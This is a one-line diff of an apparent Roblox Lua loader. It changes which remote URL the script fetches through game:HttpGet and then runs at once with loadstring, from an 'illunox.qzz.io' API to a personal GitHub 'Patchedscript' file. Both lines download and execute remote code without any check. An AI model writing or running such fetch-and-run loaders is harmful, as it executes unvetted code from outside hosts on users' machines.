@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://illunox.qzz.io/api/scripts/8f18993f01ef4ac4814a20ab867aac73"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JNHHGaming/Patchedscript/refs/heads/main/JN%20HH%20Gaming",true))()
